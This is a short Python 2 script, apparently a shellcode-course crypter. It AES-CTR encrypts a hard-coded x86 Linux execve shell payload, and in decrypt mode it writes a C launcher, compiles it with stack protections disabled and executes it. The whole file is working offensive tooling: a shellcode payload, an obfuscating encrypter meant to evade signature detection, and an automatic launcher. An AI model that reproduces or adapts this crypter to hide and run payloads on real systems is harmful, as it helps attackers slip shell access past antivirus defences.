#!/usr/bin/env python

import struct
import sys
import pyaes		
import os

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# encrypt or decrypt
method = sys.argv[1]

# A 256 bit (32 byte) key
key = sys.argv[2]

encrypted_shellcode = ""
if method == 'decrypt':
	encrypted_shellcode = sys.argv[3]

if len(key) != 16 and len(key) != 32:
	print "[-] Error: Invalid key length"
	sys.exit(0)


counter = pyaes.Counter(initial_value = 100)
aes = pyaes.AESModeOfOperationCTR(key, counter = counter)


if (method == "encrypt"):
	encrypted_shellcode = aes.encrypt(shellcode)
	eShellcode = ""
	for x in bytearray(encrypted_shellcode) :
        	eShellcode += '\\x'
	        eShellcode += '%02x' % x
	print "[+] Encrypted shellcode: %s"%(eShellcode)
elif (method == "decrypt"):
	shellcode = aes.decrypt(encrypted_shellcode.decode("hex"))
        eShellcode = ""
        for x in bytearray(shellcode) :
                eShellcode += '\\x'
                eShellcode += '%02x' % x
	print "[*] Decrypted shellcode: %s"%eShellcode
	c_code = '''
#include<stdio.h>									 
#include<string.h>									
											
unsigned char code[] =  \"%s\"; 							
											
int main() {										
	printf(\"Shellcode Length:  %%d\", strlen(code));				
	int (*ret)() = (int(*)())code;							
	ret();										
}											
'''%eShellcode
	f = open("shellcode.c","w")
	f.write(c_code)
	f.close()
	print "[*] Compiling shellcode.c\n%s"%c_code
	os.system("gcc -fno-stack-protector -z execstack shellcode.c -o shellcode")
	print "[+] Launching shellcode..."
	os.system("./shellcode")
		


